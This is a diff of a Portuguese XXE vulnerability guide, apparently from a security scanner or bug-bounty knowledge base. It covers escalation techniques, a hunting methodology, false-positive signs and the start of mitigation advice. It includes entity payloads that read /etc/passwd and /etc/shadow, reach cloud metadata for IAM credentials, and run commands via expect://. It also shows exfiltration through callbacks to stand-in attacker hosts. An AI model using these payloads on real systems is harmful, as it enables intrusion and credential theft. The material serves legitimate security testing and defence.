@@ -121,43 +121,47 @@ Casos reais e mentalidade de ataque (RWBH): Yahoo (parsers XML em mail/upload) e
 | CVE-2021-23926 | Apache XMLBeans | 2021 | Parser XML sem properties de seguranca -- Billion Laughs e XXE out-of-band | OOB + DoS |
 | CVE-2021-29505 | XStream | 2021 | RCE via desserializacao de objeto embarcado em XML | RCE via XML |
 
-## Escalation Techniques
-XXE e um vetor versatil que pode escalar para varios impactos:
-
-- **Leitura de arquivos sensiveis:** `<!ENTITY xxe SYSTEM "file:///etc/passwd">` permite ler arquivos do servidor. Escalar para `/etc/shadow`, chaves SSH, configuracoes de banco, credenciais em `.env`.
-- **SSRF via XXE:** `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` permite acessar metadata de cloud, servicos internos e portas fechadas ao exterior.
-- **Port scanning interno:** variar a porta no SYSTEM URL e observar tempos de resposta ou erros para mapear servicos internos.
-- **RCE via expect://:** em PHP com `expect` habilitado, `<!ENTITY xxe SYSTEM "expect://id">` executa comandos no servidor. Raro mas devastador.
-- **Billion Laughs (DoS):** entidades recursivas consomem memoria exponencialmente, derrubando o parser e potencialmente o servidor inteiro.
-- **Exfiltracao OOB (Out-of-Band):** quando a resposta nao reflete o conteudo, usar parameter entities para enviar dados via DNS ou HTTP para servidor controlado.
-- **XXE em documentos compostos:** DOCX, XLSX, SVG, PDF sao ZIP com XML interno. Upload de documento malicioso pode triggerar XXE no parser server-side.
-
-## Hunting Methodology
-Processo para identificar XXE:
-
-1. **Identificar endpoints que processam XML:** buscar `Content-Type: application/xml`, `text/xml`, `application/soap+xml`. Verificar se a aplicacao aceita XML mesmo quando o Content-Type default e JSON.
-2. **Testar upload de arquivos:** SVG, DOCX, XLSX, PPTX, RSS/Atom feeds -- todos contem XML internamente.
-3. **Injetar DTD basica:** enviar `<!DOCTYPE test [<!ENTITY xxe "CANARY">]><root>&xxe;</root>` e verificar se "CANARY" aparece na resposta.
-4. **Escalar para file read:** trocar `"CANARY"` por `SYSTEM "file:///etc/hostname"`. Se o conteudo do arquivo aparece na resposta, e XXE confirmado.
-5. **Testar OOB:** se a resposta nao reflete o conteudo, usar servidor de callback (Collaborator, interact.sh) com `<!ENTITY xxe SYSTEM "http://callback.attacker.com/xxe">`.
-6. **Testar SAML/SOAP:** endpoints de autenticacao SAML e web services SOAP processam XML por definicao -- testar com DTD injetada.
-7. **Verificar error-based:** enviar SYSTEM URL invalida e observar se o erro vaza informacao do path ou do parser.
-
-## False Positive Indicators
-Sinais de que o finding **nao e XXE exploravel**:
-
-- **Parser rejeita DOCTYPE:** resposta contem erro "DOCTYPE is disallowed" -- parser configurado com `disallow-doctype-decl`.
-- **Entidade nao resolvida:** `&xxe;` aparece literalmente na resposta em vez do conteudo do arquivo.
-- **XML processado client-side:** JavaScript no browser faz o parsing, nao o servidor.
-- **Content-Type nao e XML:** endpoint aceita o body mas o processa como texto plano ou JSON.
-- **Upload aceita mas nao processa XML interno:** servidor armazena o arquivo sem extrair ou renderizar o XML.
-- **OOB callback recebido mas sem dados:** DNS resolve mas nenhum dado e exfiltrado -- pode indicar firewall de egress.
-- **Erro de parsing generico sem vazamento:** "Malformed XML" sem path ou conteudo de arquivo no erro.
-
 ## Target Context (Crawler Hints)
 - **Parâmetros comuns:** `xml`, `data`, `document`, `file`, `upload`, `content`, `body`, `payload`, `svg`, `feed`, `soap`, `saml`, `config`.
 - **Paths comuns:** `/api/import`, `/upload`, `/xml`, `/soap`, `/saml`, `/parse`, `/convert`, `/preview`, `/avatar`, `/invoice`, `/export`.
 - **Sinais:** `Content-Type: application/xml`, `text/xml`, `application/soap+xml`; upload de SVG/DOCX/XLSX; resposta contém conteúdo de arquivo; erros de parser com path local.
+
+## Escalation Techniques
+XXE pode ser escalado bem alem da leitura de um unico arquivo:
+
+- **Leitura de arquivos sensiveis:** usar `file://` para extrair `/etc/shadow`, chaves SSH, `.bash_history`, arquivos de configuracao e codigo-fonte. O `.bash_history` e particularmente util por conter URLs internas, IPs e caminhos de arquivos.
+- **SSRF via XXE:** substituir a URL da entidade externa por enderecos internos (`http://10.0.0.1:80`, `http://169.254.169.254/latest/meta-data/`) para port scan da rede interna e exfiltracao de metadata cloud (AWS IAM credentials).
+- **XXE cego com DTD externo:** quando a resposta nao reflete o conteudo, hospedar um DTD externo no servidor do atacante com parameter entities que enviam os dados em URL parameter ou via erro (File Not Found com dados no path).
+- **Exfiltracao via erro:** forcar erro referenciando arquivo inexistente cujo path inclui o conteudo do arquivo-alvo -- o parser retorna o conteudo no stack trace do erro.
+- **DoS (Billion Laughs):** entidades recursivas que expandem exponencialmente (um `lol9` vira um bilhao de `lol`), consumindo memoria do parser ate crash. Nunca testar em producao.
+- **CDATA para arquivos com caracteres especiais:** envolver conteudo em tags `<![CDATA[...]]>` no DTD externo para exfiltrar arquivos XML ou com `<`, `>`, `&` sem quebrar a sintaxe.
+- **PHP wrappers e FTP:** em alvos PHP, usar `php://filter/convert.base64-encode/resource=` para codificar binarios; usar FTP em vez de HTTP para contornar restricoes de caracteres especiais e limite de tamanho de URL.
+- **Pivot para rede interna:** informacoes obtidas via SSRF (portas abertas, servicos, metadata) permitem pivotar para servicos internos nao expostos.
+
+Ao avaliar impacto, considere: o parser permite SYSTEM/PUBLIC? Ha reflexao na resposta ou e blind? O servidor faz requests outbound? Quais arquivos sao acessiveis com as permissoes do processo?
+
+## Hunting Methodology
+Processo passo a passo para identificar XXE:
+
+1. **Encontrar pontos de entrada XML:** mapear endpoints que recebem XML diretamente (POST body, SOAP), ou que aceitam formatos baseados em XML (SVG, DOCX, XLSX, PPTX, RSS, SAML). Buscar a string `<?xml` e blocos base64 que comecem com `LD94bWw` (que e `<?xml` em base64).
+2. **Forcar processamento XML:** em endpoints que aceitam JSON ou texto, alterar o `Content-Type` para `text/xml` ou `application/xml` e enviar XML no body -- alguns parsers processam XML mesmo sem ser o formato padrao.
+3. **Testar XXE classico:** inserir entidade simples (`<!ENTITY test "Hello!">`) e verificar se e resolvida. Depois testar `SYSTEM "file:///etc/hostname"`. Se `SYSTEM` nao funcionar, tentar `PUBLIC "abc" "file:///etc/hostname"`.
+4. **Testar XXE cego (blind):** se nao ha reflexao na resposta, configurar callback listener e usar entidade externa apontando para seu servidor (`http://attacker:80/xxe_test.txt`). Verificar logs por request recebido. Testar portas 80 e 443 primeiro para contornar firewalls.
+5. **Embutir payload em diferentes formatos:** inserir XXE em SVG (adicionar DTD e `<text>&xxe;</text>`), em DOCX (editar `/word/document.xml` e reempacotar com `zip -r`), XLSX e PPTX.
+6. **Testar XInclude:** quando nao ha controle sobre o documento XML inteiro, usar `<xi:include parse="text" href="file:///etc/hostname"/>` no campo de input.
+7. **Escalar:** se leitura de arquivo funcionar, tentar arquivos mais sensiveis (`/etc/shadow`, `~/.bash_history`). Se blind funcionar, tentar exfiltrar via DTD externo ou erro.
+8. **Tentar SSRF:** substituir URL da entidade por endpoints internos e metadata cloud.
+
+## False Positive Indicators
+Sinais de que a deteccao pelo scanner **nao e XXE exploravel**:
+
+- **Parser com DTD desabilitado:** muitos parsers modernos desabilitam DTDs ou entidades externas por padrao (ex: Java com `FEATURE_SECURE_PROCESSING`, .NET com `DtdProcessing.Prohibit`). A presenca de endpoint XML nao implica vulnerabilidade.
+- **WAF/proxy bloqueando DOCTYPE:** se o request com `<!DOCTYPE` e rejeitado antes de chegar ao parser, a vulnerabilidade nao e alcancavel. O scanner pode reportar "aceita XML" sem confirmar processamento de entidade.
+- **Resposta identica com e sem entidade:** se o canary (`&test;`) nao aparece resolvido na resposta e nao ha callback OOB, o parser pode estar ignorando entidades.
+- **Content-Type forcado mas ignorado:** alterar Content-Type para `application/xml` pode receber 200, mas o server pode nao estar parseando o body como XML -- verificar se o conteudo da entidade realmente aparece.
+- **Entidade resolvida mas acesso restrito:** o parser pode resolver entidades internas (`<!ENTITY x "hello">`) mas bloquear `SYSTEM`/`PUBLIC` -- isso mostra processamento de DTD mas nao e XXE.
+- **Arquivo inacessivel por permissao:** mesmo com XXE confirmado, o processo pode nao ter permissao para ler arquivos sensiveis. Erro de acesso nao significa ausencia de vuln, mas limita impacto.
+- **Formato nao-XML tratado como XML:** scanner detecta upload de SVG/DOCX mas o servidor nao processa o XML internamente (ex: armazena como blob sem parse).
 
 ## Recommendation
 1. Desabilitar DTDs e entidades externas no parser. Em Java:
